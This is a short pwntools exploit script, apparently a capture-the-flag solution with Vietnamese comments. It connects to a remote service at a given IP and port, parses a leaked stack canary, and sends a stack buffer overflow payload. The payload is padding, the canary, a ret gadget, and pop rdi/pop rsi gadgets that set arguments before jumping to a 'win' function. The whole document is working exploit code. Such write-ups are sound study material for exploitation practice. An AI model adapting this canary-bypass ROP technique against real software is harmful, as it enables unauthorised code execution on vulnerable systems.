
from pwn import *

c = connect('103.77.175.40', 6021)

# 2. Đọc đến đoạn "My favorite canary is: 0x"
c.recvuntil(b"My favorite canary is: 0x")

# 3. Đọc nốt con số hex còn lại trên dòng đó
canary_hex = c.recvline().strip()
canary = int(canary_hex, 16)
a1 = 0xDEADBEEFDEADBEEF
a2 = 0xDEADBEEFDEADBEEF
pop_rdi = 0x0000000000401205 #0x0000000000401205 : pop rdi ; ret
pop_rsi = 0x000000000040120e #0x000000000040120e : pop rsi ; ret

# win: 0x401213

payload = b'A'*88
payload += p64(canary)
payload += b'B'*8
payload += p64(0x000000000040101a)
payload += p64(pop_rdi) + p64(a1)
payload += p64(pop_rsi) + p64(a2)
payload += p64(0x401213)


c.sendlineafter(b'number: ' , payload)

c.interactive()
